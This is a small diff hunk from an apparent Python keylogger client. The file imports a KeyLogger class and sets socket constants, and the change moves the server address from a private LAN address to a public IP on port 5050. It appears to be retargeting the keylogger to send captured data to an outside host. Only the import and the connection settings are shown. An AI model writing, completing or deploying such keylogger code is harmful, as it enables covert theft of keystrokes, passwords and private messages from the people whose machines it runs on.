@@ -8,7 +8,7 @@ from keylogger import KeyLogger
 HEADER = 2048
 PORT = 5050
 FORMAT = 'utf-8'
-SERVER = "192.168.1.26"
+SERVER = '5.29.17.38'
 ADDR = (SERVER, PORT)
 
 
